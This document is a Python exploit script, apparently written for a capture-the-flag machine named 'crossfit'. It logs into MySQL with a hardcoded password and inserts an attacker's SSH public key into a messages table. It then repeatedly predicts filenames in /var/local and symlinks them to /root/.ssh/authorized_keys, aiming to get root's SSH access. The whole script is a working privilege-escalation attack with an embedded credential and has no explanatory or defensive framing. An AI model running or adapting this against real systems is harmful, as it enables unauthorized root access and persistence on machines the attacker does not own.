#!/usr/bin/python3
import subprocess
import os
import hashlib
import time

os.system(f"""
mysql -u crossfit -poeLoo~y2baeni crossfit -e "insert into messages (id, name, message, email) values (1, 'ssh-rsa', 'AAAAB3NzaC1yc2EAAAADAQABAAACAQC2AdABqOcw/WmqInU7L44fre+M9MaIepFJdqO88YmsiL134dxW3zuI+kuZeOmWV1kXLMi5A4E+hEnBJRiXK6BpWMnFisd073uEaNLI4oVqsDvG9aiH4M0tNH1rw/4KsL5CV2Nq5IWSSqqHuI75v6/pX9gueOWVIm/eGpitZ/Y89EhzmfIwqPO/uezW/Xf7l9W636y5LmcJulqo6OIvo+HlGJtup8EYrZFH+lDOhbbDUDVz1p5LcTSgaMyijNZ7r0xCuRnjCzpMnqtMO5BOyWYYGLdyIL0GsROyHKhzQJZV6bB3uQW1n08+OQsUsglmvlFLvJE/dy09MylE34r4eklRoddcYzwUm5GIeeuOKRB2ChuvY+S9E+WEih/ucbXUg1AdfPGvyyCxi+xc65qExC/YGgsnU2pb2mTLR1bBne4KeBLa/Vr0oms7WP+T1vBEYl7pJwJbhp0hHxezjMWiQ0hX6QAHX9e9bFo+AiarKNbKVmACaVdbIJc3yxaqga73cAIAT8e7SeDAiJOyteFVkWNBGp7OaolkckEeibLR8KPjhlgPiQSdYYzX0TBoQhi5E44b/PgqOy0Qx1DTQXbi3V6qNF1tDohTF36VRdk1vxK6vTlQfyzGKTgHI+HUGNOEJM7wS2oGdxZXSZ3wbjozvKNUHqAD23fi8M+LdCSEvsm26w==', 'root@kali')"
""")

t = os.system(f"""
mysql -u crossfit -poeLoo~y2baeni crossfit -e 'select * from messages' 
""")
print(t)
print("[+] Exploit will start in 5 seconds....")
time.sleep(5)


offset = 0
while True:
    proc = subprocess.Popen(['./rand', str(offset)], stdout=subprocess.PIPE)
    rand = int(proc.stdout.readline().decode())
    filename = "{}1".format(rand)
    md5file = hashlib.md5(filename.encode('utf-8')).hexdigest()
    path = "/var/local/{}".format(md5file)
    try:
        os.symlink("/root/.ssh/authorized_keys", path)
        print("[+] File `{}` is symlinked to authorized_keys.".format(path))
    except:
        print("[!] Error when trying to create symlink for file `{}`.".format(path))
    offset+=1
